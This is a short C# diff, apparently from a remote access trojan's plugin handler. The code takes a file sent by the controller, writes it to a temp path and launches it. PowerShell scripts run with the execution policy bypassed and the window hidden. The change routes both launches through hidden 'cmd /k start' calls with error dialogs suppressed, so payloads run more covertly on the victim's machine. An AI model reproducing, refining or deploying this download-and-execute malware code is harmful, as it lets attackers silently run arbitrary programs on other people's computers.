@@ -18,9 +18,24 @@ namespace Plugin.Handler
                 string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                 File.WriteAllBytes(fullPath, Methods.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                 if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
-                    Process.Start(new ProcessStartInfo { FileName = "powershell", Arguments = "–ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"" + fullPath + "\"", CreateNoWindow = true, WindowStyle = ProcessWindowStyle.Hidden });
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = "cmd",
+                        Arguments = $"/k start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File \"{fullPath}\" & exit",
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = true,
+                        ErrorDialog = false,
+                    });
                 else
-                    Process.Start(fullPath);
+                    Process.Start(new ProcessStartInfo {
+                        FileName = "cmd",
+                        Arguments = $"/k start {fullPath} & exit",
+                        CreateNoWindow = true,
+                        WindowStyle = ProcessWindowStyle.Hidden,
+                        UseShellExecute = true,
+                        ErrorDialog = false,
+                    });
                 if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                 {
                     new HandleUninstall();
